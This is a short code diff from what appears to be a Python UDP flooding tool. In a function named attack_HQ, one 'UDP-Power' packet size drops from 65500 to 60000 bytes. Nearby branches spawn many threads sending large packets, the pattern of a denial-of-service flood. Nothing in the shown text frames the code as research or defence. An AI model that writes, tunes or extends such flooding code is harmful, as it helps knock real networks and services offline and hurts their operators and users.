@@ -32,7 +32,7 @@ def attack_HQ():
             threading.Thread(target=send_packet(375), daemon=True).start()
     if method == "UDP-Power":
         for sequence in range(loops):
-            threading.Thread(target=send_packet(65500), daemon=True).start()
+            threading.Thread(target=send_packet(60000), daemon=True).start()
     if method == "UDP-Mix":
         for sequence in range(loops):
             threading.Thread(target=send_packet(65500), daemon=True).start()
